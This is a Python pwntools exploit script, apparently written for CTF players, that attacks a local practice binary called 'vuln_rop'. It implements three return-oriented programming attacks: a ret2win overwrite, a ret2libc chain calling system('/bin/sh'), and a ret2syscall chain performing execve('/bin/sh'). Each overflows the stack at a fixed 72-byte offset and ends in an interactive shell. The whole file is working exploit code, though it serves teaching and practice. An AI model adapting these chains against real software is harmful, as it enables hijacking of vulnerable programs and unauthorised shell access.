#!/usr/bin/env python3
"""
ROP Exploit for vuln_rop (x64)
Demonstrates multiple ROP techniques for CTF players

Techniques covered:
1. ret2win (beginner)
2. ret2libc (intermediate)
3. ret2syscall (advanced)
"""

from pwn import *

# Configuration
binary = ELF('./vuln_rop')
context.arch = 'amd64'
context.log_level = 'info'

# ============================================
# Technique 1: ret2win (Easiest)
# ============================================
def exploit_ret2win():
    """Simply return to win() function"""
    log.info("Technique 1: ret2win")
    
    p = process(binary.path)
    
    # Find win() address
    win_addr = binary.symbols['win']
    log.info(f"win() @ {hex(win_addr)}")
    
    # Calculate offset
    offset = 72  # Determined via cyclic pattern
    
    # Build payload
    payload = b"A" * offset
    payload += p64(win_addr)  # Overwrite return address with win()
    
    # Send and interact
    p.sendlineafter(b"Enter input: ", payload)
    p.interactive()

# ============================================
# Technique 2: ret2libc (Intermediate)
# ============================================
def exploit_ret2libc():
    """Call system() from libc"""
    log.info("Technique 2: ret2libc")
    
    p = process(binary.path)
    
    # Find gadgets
    rop = ROP(binary)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    
    log.info(f"pop rdi; ret @ {hex(pop_rdi)}")
    
    # Find "/bin/sh" string
    try:
        binsh = next(binary.search(b'/bin/sh\x00'))
        log.info(f"/bin/sh @ {hex(binsh)}")
    except StopIteration:
        log.error("No /bin/sh in binary, compile with: echo '/bin/sh' | ...")
        return
    
    # Build ROP chain
    offset = 72
    
    payload = b"A" * offset
    payload += p64(ret)          # Stack alignment (CRITICAL for modern libc!)
    payload += p64(pop_rdi)      # pop rdi; ret
    payload += p64(binsh)        # "/bin/sh"
    payload += p64(binary.plt['system'])  # system@plt
    
    # Send and interact
    p.sendlineafter(b"Enter input: ", payload)
    p.interactive()

# ============================================
# Technique 3: ret2syscall (Advanced)
# ============================================
def exploit_ret2syscall():
    """Execute execve syscall via ROP"""
    log.info("Technique 3: ret2syscall")
    
    p = process(binary.path)
    
    # Find gadgets
    rop = ROP(binary)
    
    try:
        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
        pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
        pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
        pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
        syscall = rop.find_gadget(['syscall', 'ret'])[0]
        
        log.info(f"pop rdi; ret @ {hex(pop_rdi)}")
        log.info(f"syscall; ret @ {hex(syscall)}")
    except:
        log.error("Missing gadgets! Compile with more code or link libc")
        return
    
    # Find "/bin/sh"
    binsh = next(binary.search(b'/bin/sh\x00'))
    
    # Build ROP chain for execve("/bin/sh", NULL, NULL)
    offset = 72
    
    payload = b"A" * offset
    payload += p64(pop_rdi)      # pop rdi; ret
    payload += p64(binsh)        # RDI = "/bin/sh"
    payload += p64(pop_rsi_r15)  # pop rsi; pop r15; ret
    payload += p64(0)            # RSI = NULL
    payload += p64(0)            # R15 = junk
    payload += p64(pop_rdx)      # pop rdx; ret
    payload += p64(0)            # RDX = NULL
    payload += p64(pop_rax)      # pop rax; ret
    payload += p64(59)           # RAX = 59 (execve)
    payload += p64(syscall)      # syscall; ret
    
    # Send and interact
    p.sendlineafter(b"Enter input: ", payload)
    p.interactive()

# ============================================
# Main
# ============================================
if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 exploit_rop.py <technique>")
        print("Techniques:")
        print("  1 - ret2win (easiest)")
        print("  2 - ret2libc (intermediate)")
        print("  3 - ret2syscall (advanced)")
        sys.exit(1)
    
    technique = sys.argv[1]
    
    if technique == '1':
        exploit_ret2win()
    elif technique == '2':
        exploit_ret2libc()
    elif technique == '3':
        exploit_ret2syscall()
    else:
        log.error("Invalid technique! Choose 1, 2, or 3")
